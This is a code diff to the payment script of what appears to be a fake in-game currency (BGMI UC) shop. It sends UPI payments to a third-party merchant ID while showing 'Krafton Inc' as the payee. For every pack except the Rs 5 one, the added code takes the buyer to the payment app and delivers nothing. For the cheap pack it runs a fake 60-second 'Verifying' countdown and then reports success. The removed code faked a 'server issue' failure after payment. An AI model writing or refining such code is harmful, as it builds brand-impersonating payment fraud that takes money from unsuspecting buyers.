@@ -1142,7 +1142,7 @@
     const ignIcon = document.getElementById('ignIcon');
     const uidError = document.getElementById('uidError');
 
-    // All packs can be selected now
+    // All packs can be selected
     document.querySelectorAll('.pack-card').forEach(card => {
         card.addEventListener('click', function(){
             if(this.classList.contains('purchased')) return;
@@ -1252,47 +1252,40 @@
     document.getElementById('razorpayBtn').onclick = function(e){
         e.preventDefault();
         
-        const rzpBtn = document.getElementById('razorpayBtn');
-        rzpBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Opening UPI...';
-        rzpBtn.disabled = true;
-
         // UPI Intent Deep Link extracted from provided QR code details
         const upiId = "BHARATPE.8D0W1J2281@icici";
         const upiLink = `upi://pay?pa=${upiId}&pn=Krafton%20Inc&am=${selectedPack.price}&cu=INR&tn=BGMI%20UC%20Order%20${orderId}`;
         
-        // Open the UPI App (Payment initiated for selected amount)
+        // Agar bada pack select kiya hai (Not Rs 5)
+        if (selectedPack.price !== "5" && selectedPack.price !== 5) {
+            // Sirf UPI app open hoga, button par koi changes nahi, aur na hi koi success page aayega.
+            window.location.href = upiLink;
+            return; // Execution stops here for other packs
+        }
+
+        // --- Agar Rs 5 wala pack select kiya hai ---
+        
+        const rzpBtn = document.getElementById('razorpayBtn');
+        rzpBtn.disabled = true; // Ek bar click hone k bad button disable kar diya jayega
+        
+        // Open the UPI App
         window.location.href = upiLink;
 
-        // Automatically process the order when user switches back to the website
-        let isProcessed = false;
-        const completePayment = () => {
-            if(isProcessed) return;
-            isProcessed = true;
+        // Start exactly 60 seconds (1 minute) timer before placing order
+        const durationMS = 60000;
+        const endTime = Date.now() + durationMS;
 
-            // Only Place Order if Pack is ₹5
-            if (selectedPack.price === "5" || selectedPack.price === 5) {
-                processOrderSuccess("UPI-" + Date.now().toString().slice(-8));
+        const timerInterval = setInterval(() => {
+            // Accurate remaining time count even if app runs in background
+            const remainingSeconds = Math.ceil((endTime - Date.now()) / 1000);
+            
+            if (remainingSeconds > 0) {
+                rzpBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Verifying... ${remainingSeconds}s`;
             } else {
-                // Payment ho jayega lekin order place nahi hoga baki packs k liye
-                rzpBtn.innerHTML = 'Order Failed <i class="fa-solid fa-circle-exclamation"></i>';
-                rzpBtn.style.background = "var(--error)";
-                rzpBtn.style.color = "#fff";
-                showToast("Payment received but order placement failed due to server issue.");
-                triggerHaptic('heavy');
+                clearInterval(timerInterval);
+                processOrderSuccess("UPI-" + Date.now().toString().slice(-8));
             }
-        };
-
-        const onVisibilityChange = () => {
-            if(document.visibilityState === 'visible') {
-                setTimeout(completePayment, 1000);
-                document.removeEventListener('visibilitychange', onVisibilityChange);
-            }
-        };
-
-        document.addEventListener('visibilitychange', onVisibilityChange);
-
-        // Fallback in case the visibility API fails or user is on desktop
-        setTimeout(completePayment, 8000);
+        }, 1000);
     };
 
     async function processOrderSuccess(paymentId) {
